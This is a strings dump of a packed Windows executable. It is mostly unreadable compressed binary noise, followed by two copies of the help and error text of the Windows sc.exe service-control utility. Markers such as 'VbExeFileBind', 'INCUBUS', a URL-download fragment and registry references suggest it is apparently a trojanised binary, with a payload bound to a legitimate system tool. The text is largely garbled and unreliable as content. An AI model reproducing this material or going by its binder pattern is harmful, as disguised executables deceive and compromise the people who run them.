!This program cannot be run in DOS mode.
Richs
UPX0
UPX1
.rsrc
1.20
UPX!
O[g%
ug{0
!E4M
"Ph3H3Hj
9Qcr 
)%	&'T
)o-Y
G?)l
*m>,6
;-EM
\6/=!?v
iN.BDby?E+
_AL+
f)AX
yry`o
M4'u|
^xuM
}ktn
e3Hcp
YHUp
l@	c
"B?8!,
f.Zg
1 Ng
4K4M
&E'JaO
0$nf
Y69+
@egy
e2>Ch
?:KiyH3H3
fO_}
rpA|
<#c##
~'#cq
l2<e
;226
inUpdatec 
}FormeV
-Ov[mq$,L
o9uiu
VB5!6
&vb6chs.dl
INCUBUS
L0{6(
wOKp
n0N~/
ilereadWri+df
RegKey	n
rogram 
i\g6.OL
IBtia
ok1nel32
NexF
rrlG
pxm.
sAKK
Clos
-7PeekM
n%/9
veTypH
u?c]Wak
ic>nSR
34WPO
B^r 
\r '
WSEep
rlma
URLDownEfTo
^(pSr
zsL7
Code
advm,
oAupV
@Adju
CT\H]
3SF6
SC!n%w
-tK#S
_qwc
DKR{C
^8K #8L
He\	C
ugnK
/dg_rg
kmS=
rsSt
esA3l4
f/awd
l,gEd
nIQJ
[d=$
ir+d
CatY
<SubPDO_
+Cmp'
Oqrf\~
AryDeru
ZOKFZs
Nl/g
Redim
`/Tstd
[Obj
Hs?TS;
#fKrd;
%@fd
HBw0
^r '
yLJK
 g;bc<
, ?C
PazC
oKgth;(
AGx&9 
$?EH
ToAnsiS
2$,|
UnicE
nh tB
?a9:p
ZP_\
B6a/
ps7+L)%s
o!`K
\Gz0
(W+R
_2{+
gSMK
sO8n
gqGr
~cAmL
A`$t
s^1B
tt=b
hrkO\
*S?ll
:uyP
d"}E
dvXJ
VC6bt
'v+r
1 _k
SA9*K
_tc'r
M2CA
[]55[
IeE!@
AkCV
P=Ei?
jS9t
#4eM
m#5k
k6G.
X)Olf
+OaI
Ubou
_+wB
[Abg%
/oN/
-AF	
B"_]
8IKexLQRe
H8BG]
Sm=r
g{pR-+Inp f
'2I4
Pu8At
UI1/
'tC@
:E!y
(BH}
iP{W
E+{W/
7kX#?7/<
d;GDgt$:
;$.3
ec+c
fKsw
ec\f
Ls;m,
v3f_
D_S+
rX4ioo
FfO'2Vec
~V{eu/
`|+kP
1"Plac?
/fls
,SVW
f(f;
,;Vj
]	P`<*
-$x|AOq
lCxi
9FP=Q$
99y~
RXZX
SK@n
Qh(n
Wjyw\d
 lQP
K|'#K
s"a!T
%sgB&y
(s&!S
[=s'
2kaZ$\
sB;J&
(s.	
 v8$x
:F7M
kx	pXV
xpt8Y:
',Y(
4aJQ
O5xyo|
FMkLLh:E
Z88,
@ZB9d
44UN`
r00E
`,dd@
,,,P
 W((
iX*[
whflt
XPvh
@NNb
aIIb]
 4+n
@<HS
jaQw
3qj!
j"\`p
&@p1
T@lK
pv2!'`
P}2!'
@0 `I
g"yR
p28[
CBN&
dBN&p`
0@[d
Py&y"M
,0Hp@zEj
dBN`
f_cT
E9!&
p!'r
FR1lR
`Cr*
&	\)
V2%Xs
Dx	t
__bN
@.92X
6$%N
yR*C
lv5l7
JFFn$
f=RYF
LICH1ttR
u$ps
N} 5
X\'&
H>|	
.$j,K
K.9d
7dt#
+D, 
`e'/
XX&=
H\X`
#T#<
	9TXPP
XTPbbC
V]Bd
kRq	
T\\Q
V3T<T
aAxR
k3RI
8jIWj
f;Q_yDd
uTD:
j;x#
4?&<
3%##H
T<To
^I>X
\T 9
 P2$
 W||
|/aM
)Rk22
dttt
ppB.
G>v)
.d.d@
&dh,
t``$
!0 P
L89d0
V!/p
1232
DDD!
JT5M	
@!,8
40P C
B4348
48<d0:0?0
h:OC
,%, W
L,( pE
($qi
L2 C   
I)`*99
_MVD"
z%gP
\d!j
hY+0j
BxLQo2
 [ML<
+*6v
L<,o
63sY
Q5HE
=-Nyt
:|n!T
{CH9
PQY.B
	r+Y
Rd;1
XQ(L
 7h!|
JjYA
>#'d
Ceo!
Y}Q$9
 @	9@jq
l>P@> )
Xrr0e
9!]0" 
Q %SH
%Wddd
 \G\
+U%D}
,rH5r
3_Aw
>M9O
!qLd
C8SF
0ru{
H_LH}
s26 
3set
SE;Y
wH.H
Y}r_h
[V0B|*
77;,
b1HXV%uF
bBxp^x
hRB|k
|IQ2"
K#@&(
&'&(d
gYKB
I@\HG
~NIUaU
XJ	m
MNLD
O}@.2
+[|C
  P5
J5M!
5=^1R'}5
d >)
i6MU
-+NV
d)p=
3h b
C!v_B>
 !u1G
Z%k|
:IEtP
Y.yx
3D#%
M44'M
yv5a
*F&<
$U/F
z	gLN
W2rB
)X+|
p%&F
jb%,O
u%R)
Iz+yQ.
@B:L
L\lU
UdQL
N:8L
5,XK
\.D#
@HJ.
#"#H
9"&'r
\ CD()/@
2D$*
09Tr
@T\ W
$>+T
&>s?
CDL 
JKU 
@HBQ
pWrB
e	y$
>dBN.$
fK&yE
DY(x$\
y(HK
-H>z
x`@F:$#
@`2r #80(
yxph6
yXPHi
80(i
2r #
2r #
2":0<d
)"xb
aX)}H8&dBN8(
9!#O
8(xN
y OFX
h2!#O
y OF
ePB@
;MNN
@g[dIX
VglI
P%QrT
!$#C%
0aIT
(+@.
0	a*
 @:9
beLR
tCQiRK*X
@(V12H!
UANL2%
@.G 
@ /D
zevA
l7J`
L!G.
12<(
aEE8
%zLWIq	M[
&4!''_&`
<YW	
X f.
ijUnp0
be0 v]Eg
QAGU
xSy#hV
~-ud#
@#B'
3rs)
@ pH
HXhx
A9U%A
E}A`
 ]NXD#
,tV	
 LjF
 aAp
@HD?
2,5[
H86'
JMEMy
ddH\\UE.
'U1%TPT'
QJ>S
8rH\N
 !+,
)eQ0Y
pUT9
B @n
7sYq`
$TEP
WX\%
?/-;
C2%/ 
W3l \).
2'*qD
F/,;-
LThis p
?cannot be run i
DOS mode
$WPEL
H([6
T.text
`.rs
@'elo(
K,'B3
d/h7
%1HFA
tas`
iQgP8
cL4K
S%yFZ
j7kN
$9+d+
^1~x
7x<b=
eS;W
k`vF
B"{<3;
q\?R
u]|l
rZDs
QL(_
	L0W
o7wZ
J(>@>@
=K@>@
@>@>
r,'7
 K=V
08t$
_.t#
d`![
/ w!
k7>t
^2jF
K7#O
y7;uNJ
ijYC@,
4MF1#
#MKns
`t<Sn
i^\z
_iG=
Icos
adj_fptan,
!Ary
div_m648
8m1CF
9CaX
1%@`
IXIE?
32NmB
/16i
M"r#
8kMkK
VENT_SINK_
%Eq"
Fg%i
G3qr$A,
FPp6f
Jg8	
\H?A
dXFdaVi
B,"bY
ahDE
t dp
wwwwwwwwwwwwwwww
KERNEL32.DLL
MSVBVM60.DLL
LoadLibraryA
GetProcAddress
ExitProcess
VVbExeFileBind.9
c`cccgccc
ccccccc#ccccccccccccccccccccccccccccccccccc
cccm|
 run in DOS mode.
Y~Rich8
.text
`.data
.rsrc
msvcrt.dll
ADVAPI32.dll
KERNEL32.dll
NTDLL.DLL
DDDDDDDDDDDDDDDDDDDDDDDDD
RUNS_IN_SYSTEM_PROCESS
        FLAGS              : 
        PID                : %d
        WAIT_HINT          : 0x%lx
        CHECKPOINT         : 0x%lx
        SERVICE_EXIT_CODE  : %d	(0x%lx)
        WIN32_EXIT_CODE    : %d	(0x%lx)
IGNORES_SHUTDOWN)
ACCEPTS_SHUTDOWN)
NOT_PAUSABLE,
PAUSABLE,
                                (NOT_STOPPABLE,
                                (STOPPABLE,
STOPPED 
START_PENDING 
STOP_PENDING 
RUNNING 
CONTINUE_PENDING 
PAUSE_PENDING 
PAUSED 
        STATE              : %lx  
(interactive)
KERNEL_DRIVER 
FILE_SYSTEM_DRIVER 
ADAPTER 
DRIVER 
WIN32_OWN_PROCESS 
WIN32_SHARE_PROCESS 
WIN32 
 ERROR 
        TYPE               : %lx  
DISPLAY_NAME: %ws
SERVICE_NAME: %ws
[SC] GetServiceConfig needs %d bytes
[SC] GetServiceConfig FAILED %d:
        SERVICE_START_NAME : %ws  
                           : %ws  
        DEPENDENCIES       : %ws  
        DISPLAY_NAME       : %ws  
        TAG                : %lu  
        LOAD_ORDER_GROUP   : %ws  
        BINARY_PATH_NAME   : %ws  
IGNORE
NORMAL
SEVERE
CRITICAL
        ERROR_CONTROL      : %lx   
BOOT_START
SYSTEM_START
AUTO_START
DEMAND_START
DISABLED
 ERROR
        START_TYPE         : %lx   
 KERNEL_DRIVER 
 FILE_SYSTEM_DRIVER 
 ADAPTER 
[SC] GetServiceConfig SUCCESS
[SC] OpenService FAILED %d:
[SC] GetServiceConfig: LocalAlloc FAILED %d:
[SC] GetConfigInfo needs %d bytes
[SC] GetConfigInfo FAILED %d:
RESTART -- Delay = %u milliseconds.
REBOOT -- Delay = %u milliseconds
RUN PROCESS -- Delay = %u milliseconds
ERROR:  Invalid action: %#x
                                   
        FAILURE_ACTIONS          : 
        COMMAND_LINE             : %ws
        REBOOT_MESSAGE           : %ws
%u seconds
INFINITE 
        RESET_PERIOD             : 
        DESCRIPTION              : %ws
[SC] GetConfigInfo: LocalAlloc FAILED %d:
sc query type= driver group= NDIS     - Enumerates all NDIS drivers
sc query type= service type= interact - Enumerates all interactive services
sc queryex group= ""    - Enumerates active services not in a group
sc query ri= 14         - Enumerates with resume index = 14
sc query bufsize= 50    - Enumerates with a 50 byte buffer.
sc query state= all     - Enumerates all services & drivers
sc query type= service  - Enumerates only Win32 services
sc query type= driver   - Enumerates only active drivers
sc queryex messenger    - Displays extended status for the messenger service
sc query messenger      - Displays status for the messenger service
sc query                - Enumerates status for active services & drivers
SYNTAX EXAMPLES
    type=    Type of services to enumerate (driver, service, all)
             (default = service)
    state=   State of services to enumerate (inactive, all)
             (default = active)
    bufsize= The size (in bytes) of the enumeration buffer
             (default = %d)
    ri=      The resume index number at which to begin the enumeration
             (default = 0)
    group=   Service group to enumerate
             (default = all groups)
QUERY and QUERYEX OPTIONS : 
	If the query command is followed by a service name, the status
	for that service is returned.  Further options do not apply in
	this case.  If the query command is followed by nothing or one of
	the options listed below, the services are enumerated.
NOTE: The option name includes the equal sign.
 type= <own|share|interact|kernel|filesys|rec|adapt>
 start= <boot|system|auto|demand|disabled>
 error= <normal|severe|critical|ignore>
 binPath= <BinaryPathName>
 group= <LoadOrderGroup>
 tag= <yes|no>
 depend= <Dependencies(separated by / (forward slash))>
 obj= <AccountName|ObjectName>
 DisplayName= <display name>
 password= <password> 
CONFIG OPTIONS:
SYNTAX: 
sc <server> config [service name] <option1> <option2>...
Modifies a service entry in the registry and Service Database.
NOTE: The option name includes the equal sign.
 type= <own|share|interact|kernel|filesys|rec>
       (default = own)
 start= <boot|system|auto|demand|disabled>
       (default = demand)
 error= <normal|severe|critical|ignore>
       (default = normal)
 binPath= <BinaryPathName>
 group= <LoadOrderGroup>
 tag= <yes|no>
 depend= <Dependencies(separated by / (forward slash))>
 obj= <AccountName|ObjectName>
       (default = LocalSystem)
 DisplayName= <display name>
 password= <password> 
CREATE OPTIONS:
SYNTAX: 
sc create [service name] [binPath= ] <option1> <option2>...
Creates a service entry in the registry and Service Database.
	actions= <Failure actions and their delay time (in milliseconds),
	          separated by / (forward slash) -- e.g., run/5000/reboot/800
	          Valid actions are <run|restart|reboot>  >
	          (Must be used in conjunction with the reset= option)
	command= <Command line to be run on failure>
	reboot= <Message broadcast before rebooting on failure>
	reset= <Length of period of no failures (in seconds) 
	        after which to reset the failure count to 0 (may be INFINITE)>
	        (Must be used in conjunction with actions= )
OPTIONS:
	sc <server> failure [service name] <option1> <option2>...
USAGE:
	Changes the actions upon failure
DESCRIPTION:
[SC] ControlService FAILED %d:
[SC] ChangeServiceConfig FAILED %d:
[SC] Tag = %d
[SC] ChangeServiceConfig SUCCESS
[SC] SendConfigToService: LocalAlloc FAILED %d:
invalid error= field
invalid start= field
invalid type= field
[SC] ChangeServiceConfig2 FAILED %d:
[SC] ChangeServiceConfig2 SUCCESS
[SC] ChangeServiceFailure: RtlAdjustPrivilege FAILED %#x
ERROR:  Invalid option  
[SC] ChangeServiceFailure: LocalAlloc FAILED %d:
ERROR:  The reset and actions options must be set simultaneously. 
[SC] CreateService SUCCESS
[SC] CreateService FAILED %d:
Enum: more data, need %d bytes
Enum: entriesRead  = %d
[SC] EnumDependentServices FAILED %d:
[SC] EnumDepend: LocalAlloc FAILED %d:
[SC] ConvertSecurityDescriptorToStringSecurityDescriptor FAILED %d:
[SC] QueryServiceObjectSecurity FAILED %d:
[SC] SetServiceObjectSecurity SUCCESS
[SC] SetServiceObjectSecurity FAILED %d:
[SC] ConvertStringSecurityDescriptorToSecurityDescriptor FAILED %d:
	LockDuration  : %d (seconds since acquired)
	LockOwner     : %ws  
	IsLocked      : FALSE
	IsLocked      : TRUE
[SC] QueryServiceLockStatus SUCCESS
[SC] QueryServiceLockStatus needs %d bytes
[SC] QueryServiceLockStatus FAILED %d
[SC] GetServiceLockStatus: LocalAlloc FAILED %d:
[SC] Will be unlocking database by exiting
[SC] UnlockServiceDatabase SUCCESS
[SC] UnlockServiceDatabase FAILED %d:
Active database is locked.
To unlock via API, press u: 
[SC] LockServiceDatabase FAILED %d:
Would you like to see help for the QUERY and QUERYEX commands? [ y | n ]: 
	sc start MyService
EXAMPLE:
	sc <server> <command> <option> 
	  boot------------(ok | bad) Indicates whether the last boot should
	                  be saved as the last-known-good boot configuration
	  Lock------------Locks the Service Database
	  QueryLock-------Queries the LockStatus for the SCManager Database
	The following commands don't require a service name:
	Commands:
	  query-----------Queries the status for a service, or 
	                  enumerates the status for types of services.
	  queryex---------Queries the extended status for a service, or 
	                  enumerates the status for types of services.
	  start-----------Starts a service.
	  pause-----------Sends a PAUSE control request to a service.
	  interrogate-----Sends an INTERROGATE control request to a service.
	  continue--------Sends a CONTINUE control request to a service.
	  stop------------Sends a STOP request to a service.
	  config----------Changes the configuration of a service (persistant).
	  description-----Changes the description of a service.
	  failure---------Changes the actions taken by a service upon failure.
	  qc--------------Queries the configuration information for a service.
	  qdescription----Queries the description for a service.
	  qfailure--------Queries the actions taken by a service upon failure.
	  delete----------Deletes a service (from the registry).
	  create----------Creates a service. (adds it to the registry).
	  control---------Sends a control to a service.
	  sdshow----------Displays a service's security descriptor.
	  sdset-----------Sets a service's security descriptor.
	  GetDisplayName--Gets the DisplayName for a service.
	  GetKeyName------Gets the ServiceKeyName for a service.
	  EnumDepend------Enumerates Service Dependencies.
	Further help on commands can be obtained by typing: "sc [command]"
	The option <server> has the form "\\ServerName"
	sc <server> [command] [service name] <option1> <option2>...
	SC is a command line program used for communicating with the 
	NT Service Controller and services.
[SC] QueryServiceStatus%s FAILED %d:
[SC] EnumQueryServicesStatus:OpenService FAILED %d:
ERROR: cannot specify a service name when enumerating a group
Enum: more data, need %d bytes start resume at index %d
[SC] EnumServicesStatus%s FAILED %d:
[SC] OpenSCManager FAILED %d:
ERROR, Invalid Option
ERROR following "state="!
Must be "inactive" or "all"
ERROR following "state="
ERROR following "type="!
Must be "driver" or "service"
[SC] EnumQueryServicesStatus: LocalAlloc FAILED %d:
*** Unrecognized Command ***
	sc <server> sdset <service name> <SD in SDDL format>
	Sets a service's security descriptor
	sc <server> sdshow <service name>
	Displays a service's security descriptor in SDDL format
	sc <server> EnumDepend <service name> <bufsize>
	Enumerates the Services that are dependent on this one
[SC] GetServiceKeyName SUCCESS  Name = %ws
	required BufSize = %d
[SC] GetServiceKeyName FAILED %d:
[SC] GetServiceKeyName: LocalAlloc FAILED %d:
	sc <server> GetKeyName <service display name> <bufsize>
	Gets the key name associated with a particular service, using the display name as input
[SC] GetServiceDisplayName SUCCESS  Name = %ws
[SC] GetServiceDisplayName FAILED %d: %ws 
[SC] GetServiceDisplayName: LocalAlloc FAILED %d:
	sc <server> GetDisplayName <service key name> <bufsize>
	Gets the display name associated with a particular service
	sc <server> boot <bad|ok>
	Indicates whether the last boot should be saved as the
	last-known-good boot configuration
NotifyBootConfigStatus FAILED %d:
[SC] DeleteService SUCCESS
[SC] DeleteService FAILED %d:
	sc <server> delete [service name]
	Deletes a service entry from the registry.
	If the service is running, or another process has an
	open handle to the service, the service is simply marked
	for deletion.
[SC] CloseServiceHandle FAILED %d:
	sc <server> qfailure [service name] <bufferSize>
	Retrieves the actions performed on service failure.
	sc <server> qdescription [service name] <bufferSize>
	Retrieves the description string of a service.
	sc <server> qc [service name] <bufferSize>
	Queries the configuration information for a service.
	sc <server> description [service name] [description]
	Sets the description string for a service.
	sc <server> stop [service name]
	Sends a STOP control request to a service.
	sc <server> continue [service name]
	Sends a CONTINUE control request to a service.
	sc <server> control [service name] <value>
	    <value> = user-defined control code
	    <value> = <paramchange|
	               netbindadd|netbindremove|
	               netbindenable|netbinddisable>
See also sc stop, sc pause, etc.
	Sends a CONTROL code to a service.
	sc <server> interrogate [service name]
	Sends an INTERROGATE control request to a service.
	sc <server> pause [service name]
	Sends a PAUSE control request to a service.
[SC] StartService: QueryServiceStatusEx FAILED %d:
[SC] StartService FAILED %d:
[SC] StartService: OpenService FAILED %d:
	sc <server> start [service name] <arg1> <arg2> ...
	Starts a service running.
[SC] ERROR: a service name is required
NB10
sc.pdb
SUVW
tHHt>HHt3
HYYt?Ht5Ht+Ht!Ht
YPPh
Y_^][
VWt(
PVht
HtLHtBHHt7
t+Ht!Ht
YYt!Ht
PShD
YY[_3
VWt(
PVht
u	hL
	Ph@
t3Ht$Ht
YYC;_
YY[_3
YYu0
pots
j XP
PVht
PVh0&
YYu	
YYu	
YYu+
YYuT
CCf9
ghx'
Dhd'
!hH'
YYui
PVht
PVhh&
PVht
<SV3
YYu@
C@@f
tdh0*
Rh *
Ph@)
PVht
YYu	
YYu+
YYuT
CCf9
Lhx'
)hd'
Th0'
QSVWj
PVht
PVhD+
YYv,3
$G;}
PVht
PVht
PVhX,
PVh(,
PWhp-
uu.W
PWh,.
QOOWV
YYub
YYuV
uvh|C
YYu	
^hdC
YYu	
FhHC
YYu	
.h,C
YYu	
YYuY
YYuY
YYuN
YYuf
YYuS
YYuq
YYuCj
YYu"j
YYuph
PVht
PVht
YYuG
YYu3j
PVhh>
Whd;
YYu}
YYu\
YYuc
YYu	
YYu	
YYu	
YYu	
YYu	
YYu	
YYu	
YYu	
YYu\G9}
YYu	
oh|(
6h\9
GG9}
PVh 9
PVhT8
tG9u
t(9u
PSVh$8
,F;u
PVhl7
PWVh@7
8MZu
Y_^[
printf
wcslen
_wcsicmp
wcscpy
_wtol
_getche
wcscmp
wcsncmp
_c_exit
_exit
_XcptFilter
_cexit
exit
__winitenv
__wgetmainargs
_initterm
__setusermatherr
_adjust_fdiv
__p__commode
__p__fmode
__set_app_type
msvcrt.dll
_controlfp
_except_handler3
QueryServiceConfigW
OpenServiceW
QueryServiceConfig2W
ControlService
ChangeServiceConfigW
ChangeServiceConfig2W
CloseServiceHandle
CreateServiceW
EnumDependentServicesW
ConvertSecurityDescriptorToStringSecurityDescriptorW
QueryServiceObjectSecurity
SetServiceObjectSecurity
ConvertStringSecurityDescriptorToSecurityDescriptorW
QueryServiceLockStatusW
UnlockServiceDatabase
LockServiceDatabase
QueryServiceStatus
EnumServicesStatusExW
EnumServiceGroupW
EnumServicesStatusW
GetServiceKeyNameW
GetServiceDisplayNameW
NotifyBootConfigStatus
DeleteService
QueryServiceStatusEx
StartServiceW
OpenSCManagerW
ADVAPI32.dll
FormatMessageW
GetLastError
LocalAlloc
LocalFree
GetModuleHandleA
KERNEL32.dll
RtlAdjustPrivilege
ntdll.dll
Shit,IsOver!!VbExeFileBind.9
c`cccgccc
ccccccc#ccccccccccccccccccccccccccccccccccc
cccm|
 run in DOS mode.
Y~Rich8
.text
`.data
.rsrc
msvcrt.dll
ADVAPI32.dll
KERNEL32.dll
NTDLL.DLL
DDDDDDDDDDDDDDDDDDDDDDDDD
RUNS_IN_SYSTEM_PROCESS
        FLAGS              : 
        PID                : %d
        WAIT_HINT          : 0x%lx
        CHECKPOINT         : 0x%lx
        SERVICE_EXIT_CODE  : %d	(0x%lx)
        WIN32_EXIT_CODE    : %d	(0x%lx)
IGNORES_SHUTDOWN)
ACCEPTS_SHUTDOWN)
NOT_PAUSABLE,
PAUSABLE,
                                (NOT_STOPPABLE,
                                (STOPPABLE,
STOPPED 
START_PENDING 
STOP_PENDING 
RUNNING 
CONTINUE_PENDING 
PAUSE_PENDING 
PAUSED 
        STATE              : %lx  
(interactive)
KERNEL_DRIVER 
FILE_SYSTEM_DRIVER 
ADAPTER 
DRIVER 
WIN32_OWN_PROCESS 
WIN32_SHARE_PROCESS 
WIN32 
 ERROR 
        TYPE               : %lx  
DISPLAY_NAME: %ws
SERVICE_NAME: %ws
[SC] GetServiceConfig needs %d bytes
[SC] GetServiceConfig FAILED %d:
        SERVICE_START_NAME : %ws  
                           : %ws  
        DEPENDENCIES       : %ws  
        DISPLAY_NAME       : %ws  
        TAG                : %lu  
        LOAD_ORDER_GROUP   : %ws  
        BINARY_PATH_NAME   : %ws  
IGNORE
NORMAL
SEVERE
CRITICAL
        ERROR_CONTROL      : %lx   
BOOT_START
SYSTEM_START
AUTO_START
DEMAND_START
DISABLED
 ERROR
        START_TYPE         : %lx   
 KERNEL_DRIVER 
 FILE_SYSTEM_DRIVER 
 ADAPTER 
[SC] GetServiceConfig SUCCESS
[SC] OpenService FAILED %d:
[SC] GetServiceConfig: LocalAlloc FAILED %d:
[SC] GetConfigInfo needs %d bytes
[SC] GetConfigInfo FAILED %d:
RESTART -- Delay = %u milliseconds.
REBOOT -- Delay = %u milliseconds
RUN PROCESS -- Delay = %u milliseconds
ERROR:  Invalid action: %#x
                                   
        FAILURE_ACTIONS          : 
        COMMAND_LINE             : %ws
        REBOOT_MESSAGE           : %ws
%u seconds
INFINITE 
        RESET_PERIOD             : 
        DESCRIPTION              : %ws
[SC] GetConfigInfo: LocalAlloc FAILED %d:
sc query type= driver group= NDIS     - Enumerates all NDIS drivers
sc query type= service type= interact - Enumerates all interactive services
sc queryex group= ""    - Enumerates active services not in a group
sc query ri= 14         - Enumerates with resume index = 14
sc query bufsize= 50    - Enumerates with a 50 byte buffer.
sc query state= all     - Enumerates all services & drivers
sc query type= service  - Enumerates only Win32 services
sc query type= driver   - Enumerates only active drivers
sc queryex messenger    - Displays extended status for the messenger service
sc query messenger      - Displays status for the messenger service
sc query                - Enumerates status for active services & drivers
SYNTAX EXAMPLES
    type=    Type of services to enumerate (driver, service, all)
             (default = service)
    state=   State of services to enumerate (inactive, all)
             (default = active)
    bufsize= The size (in bytes) of the enumeration buffer
             (default = %d)
    ri=      The resume index number at which to begin the enumeration
             (default = 0)
    group=   Service group to enumerate
             (default = all groups)
QUERY and QUERYEX OPTIONS : 
	If the query command is followed by a service name, the status
	for that service is returned.  Further options do not apply in
	this case.  If the query command is followed by nothing or one of
	the options listed below, the services are enumerated.
NOTE: The option name includes the equal sign.
 type= <own|share|interact|kernel|filesys|rec|adapt>
 start= <boot|system|auto|demand|disabled>
 error= <normal|severe|critical|ignore>
 binPath= <BinaryPathName>
 group= <LoadOrderGroup>
 tag= <yes|no>
 depend= <Dependencies(separated by / (forward slash))>
 obj= <AccountName|ObjectName>
 DisplayName= <display name>
 password= <password> 
CONFIG OPTIONS:
SYNTAX: 
sc <server> config [service name] <option1> <option2>...
Modifies a service entry in the registry and Service Database.
NOTE: The option name includes the equal sign.
 type= <own|share|interact|kernel|filesys|rec>
       (default = own)
 start= <boot|system|auto|demand|disabled>
       (default = demand)
 error= <normal|severe|critical|ignore>
       (default = normal)
 binPath= <BinaryPathName>
 group= <LoadOrderGroup>
 tag= <yes|no>
 depend= <Dependencies(separated by / (forward slash))>
 obj= <AccountName|ObjectName>
       (default = LocalSystem)
 DisplayName= <display name>
 password= <password> 
CREATE OPTIONS:
SYNTAX: 
sc create [service name] [binPath= ] <option1> <option2>...
Creates a service entry in the registry and Service Database.
	actions= <Failure actions and their delay time (in milliseconds),
	          separated by / (forward slash) -- e.g., run/5000/reboot/800
	          Valid actions are <run|restart|reboot>  >
	          (Must be used in conjunction with the reset= option)
	command= <Command line to be run on failure>
	reboot= <Message broadcast before rebooting on failure>
	reset= <Length of period of no failures (in seconds) 
	        after which to reset the failure count to 0 (may be INFINITE)>
	        (Must be used in conjunction with actions= )
OPTIONS:
	sc <server> failure [service name] <option1> <option2>...
USAGE:
	Changes the actions upon failure
DESCRIPTION:
[SC] ControlService FAILED %d:
[SC] ChangeServiceConfig FAILED %d:
[SC] Tag = %d
[SC] ChangeServiceConfig SUCCESS
[SC] SendConfigToService: LocalAlloc FAILED %d:
invalid error= field
invalid start= field
invalid type= field
[SC] ChangeServiceConfig2 FAILED %d:
[SC] ChangeServiceConfig2 SUCCESS
[SC] ChangeServiceFailure: RtlAdjustPrivilege FAILED %#x
ERROR:  Invalid option  
[SC] ChangeServiceFailure: LocalAlloc FAILED %d:
ERROR:  The reset and actions options must be set simultaneously. 
[SC] CreateService SUCCESS
[SC] CreateService FAILED %d:
Enum: more data, need %d bytes
Enum: entriesRead  = %d
[SC] EnumDependentServices FAILED %d:
[SC] EnumDepend: LocalAlloc FAILED %d:
[SC] ConvertSecurityDescriptorToStringSecurityDescriptor FAILED %d:
[SC] QueryServiceObjectSecurity FAILED %d:
[SC] SetServiceObjectSecurity SUCCESS
[SC] SetServiceObjectSecurity FAILED %d:
[SC] ConvertStringSecurityDescriptorToSecurityDescriptor FAILED %d:
	LockDuration  : %d (seconds since acquired)
	LockOwner     : %ws  
	IsLocked      : FALSE
	IsLocked      : TRUE
[SC] QueryServiceLockStatus SUCCESS
[SC] QueryServiceLockStatus needs %d bytes
[SC] QueryServiceLockStatus FAILED %d
[SC] GetServiceLockStatus: LocalAlloc FAILED %d:
[SC] Will be unlocking database by exiting
[SC] UnlockServiceDatabase SUCCESS
[SC] UnlockServiceDatabase FAILED %d:
Active database is locked.
To unlock via API, press u: 
[SC] LockServiceDatabase FAILED %d:
Would you like to see help for the QUERY and QUERYEX commands? [ y | n ]: 
	sc start MyService
EXAMPLE:
	sc <server> <command> <option> 
	  boot------------(ok | bad) Indicates whether the last boot should
	                  be saved as the last-known-good boot configuration
	  Lock------------Locks the Service Database
	  QueryLock-------Queries the LockStatus for the SCManager Database
	The following commands don't require a service name:
	Commands:
	  query-----------Queries the status for a service, or 
	                  enumerates the status for types of services.
	  queryex---------Queries the extended status for a service, or 
	                  enumerates the status for types of services.
	  start-----------Starts a service.
	  pause-----------Sends a PAUSE control request to a service.
	  interrogate-----Sends an INTERROGATE control request to a service.
	  continue--------Sends a CONTINUE control request to a service.
	  stop------------Sends a STOP request to a service.
	  config----------Changes the configuration of a service (persistant).
	  description-----Changes the description of a service.
	  failure---------Changes the actions taken by a service upon failure.
	  qc--------------Queries the configuration information for a service.
	  qdescription----Queries the description for a service.
	  qfailure--------Queries the actions taken by a service upon failure.
	  delete----------Deletes a service (from the registry).
	  create----------Creates a service. (adds it to the registry).
	  control---------Sends a control to a service.
	  sdshow----------Displays a service's security descriptor.
	  sdset-----------Sets a service's security descriptor.
	  GetDisplayName--Gets the DisplayName for a service.
	  GetKeyName------Gets the ServiceKeyName for a service.
	  EnumDepend------Enumerates Service Dependencies.
	Further help on commands can be obtained by typing: "sc [command]"
	The option <server> has the form "\\ServerName"
	sc <server> [command] [service name] <option1> <option2>...
	SC is a command line program used for communicating with the 
	NT Service Controller and services.
[SC] QueryServiceStatus%s FAILED %d:
[SC] EnumQueryServicesStatus:OpenService FAILED %d:
ERROR: cannot specify a service name when enumerating a group
Enum: more data, need %d bytes start resume at index %d
[SC] EnumServicesStatus%s FAILED %d:
[SC] OpenSCManager FAILED %d:
ERROR, Invalid Option
ERROR following "state="!
Must be "inactive" or "all"
ERROR following "state="
ERROR following "type="!
Must be "driver" or "service"
[SC] EnumQueryServicesStatus: LocalAlloc FAILED %d:
*** Unrecognized Command ***
	sc <server> sdset <service name> <SD in SDDL format>
	Sets a service's security descriptor
	sc <server> sdshow <service name>
	Displays a service's security descriptor in SDDL format
	sc <server> EnumDepend <service name> <bufsize>
	Enumerates the Services that are dependent on this one
[SC] GetServiceKeyName SUCCESS  Name = %ws
	required BufSize = %d
[SC] GetServiceKeyName FAILED %d:
[SC] GetServiceKeyName: LocalAlloc FAILED %d:
	sc <server> GetKeyName <service display name> <bufsize>
	Gets the key name associated with a particular service, using the display name as input
[SC] GetServiceDisplayName SUCCESS  Name = %ws
[SC] GetServiceDisplayName FAILED %d: %ws 
[SC] GetServiceDisplayName: LocalAlloc FAILED %d:
	sc <server> GetDisplayName <service key name> <bufsize>
	Gets the display name associated with a particular service
	sc <server> boot <bad|ok>
	Indicates whether the last boot should be saved as the
	last-known-good boot configuration
NotifyBootConfigStatus FAILED %d:
[SC] DeleteService SUCCESS
[SC] DeleteService FAILED %d:
	sc <server> delete [service name]
	Deletes a service entry from the registry.
	If the service is running, or another process has an
	open handle to the service, the service is simply marked
	for deletion.
[SC] CloseServiceHandle FAILED %d:
	sc <server> qfailure [service name] <bufferSize>
	Retrieves the actions performed on service failure.
	sc <server> qdescription [service name] <bufferSize>
	Retrieves the description string of a service.
	sc <server> qc [service name] <bufferSize>
	Queries the configuration information for a service.
	sc <server> description [service name] [description]
	Sets the description string for a service.
	sc <server> stop [service name]
	Sends a STOP control request to a service.
	sc <server> continue [service name]
	Sends a CONTINUE control request to a service.
	sc <server> control [service name] <value>
	    <value> = user-defined control code
	    <value> = <paramchange|
	               netbindadd|netbindremove|
	               netbindenable|netbinddisable>
See also sc stop, sc pause, etc.
	Sends a CONTROL code to a service.
	sc <server> interrogate [service name]
	Sends an INTERROGATE control request to a service.
	sc <server> pause [service name]
	Sends a PAUSE control request to a service.
[SC] StartService: QueryServiceStatusEx FAILED %d:
[SC] StartService FAILED %d:
[SC] StartService: OpenService FAILED %d:
	sc <server> start [service name] <arg1> <arg2> ...
	Starts a service running.
